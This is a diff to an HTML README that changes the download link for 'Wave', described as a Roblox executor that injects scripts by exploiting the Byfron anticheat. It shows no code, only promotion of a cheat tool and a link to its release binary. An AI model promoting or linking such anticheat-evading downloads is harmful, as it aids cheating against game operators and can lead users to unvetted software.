@@ -29,7 +29,7 @@ While the program may be used to assess the security of roblox executor, it shou
     Wave is a Roblox Executor that injects script that takes advantage of Roblox weak anticheat Byfron.
     <br/>
     <br/>
-    <a href="https://github.com/CheatsHelp/Wave-Executor-Roblox/releases/tag/wave-roblox-executor">Download</a>
+    <a href="https://github.com/CheatsHelp/Wave-Executor-Roblox/releases/tag/wave-executor-roblox">Download</a>
     .
     <a href="https://github.com/CheatsHelp/Wave-Roblox-Executor">Site</a>
   </p>
